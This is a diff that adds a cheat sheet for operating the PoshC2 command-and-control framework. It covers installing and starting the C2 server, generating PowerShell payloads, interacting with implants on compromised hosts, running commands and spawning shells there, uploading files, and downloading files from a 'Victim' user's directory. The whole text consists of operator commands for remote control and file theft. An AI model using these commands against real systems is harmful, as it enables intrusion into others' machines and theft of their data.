@@ -1,0 +1,50 @@
+# ================= PoshC2 =================
+# Clone the PoshC2 repository
+git clone https://github.com/nettitude/PoshC2.git
+cd PoshC2
+
+# Install dependencies
+sudo ./Install.sh
+
+# Start PoshC2 setup (configures C2 server and implant options)
+python3 PoshC2.py --setup
+
+# Start the C2 server
+python3 PoshC2.py
+
+# Launch the Implant Handler to interact with sessions
+python3 ImplantHandler.py
+
+# View all active implants
+list
+
+# Interact with a specific implant
+interact <implant_id>
+
+# Run a command on the implant
+run whoami
+
+# Upload a file to the target
+upload /path/to/local/file.txt
+
+# Download a file from the target
+download C:\Users\Victim\file.txt
+
+# Spawn a new command prompt
+shell
+
+# Load additional modules
+loadmodule /path/to/module.ps1
+
+# Create a new payload
+python3 Payloads.py
+
+# Example: Generate PowerShell payload
+python3 Payloads.py --payload-type all
+
+# Rebuild payloads with new configuration
+python3 PoshC2.py --update
+
+# View logs and task output
+cd /var/www/html/Logs
+cat <implant_id>.log
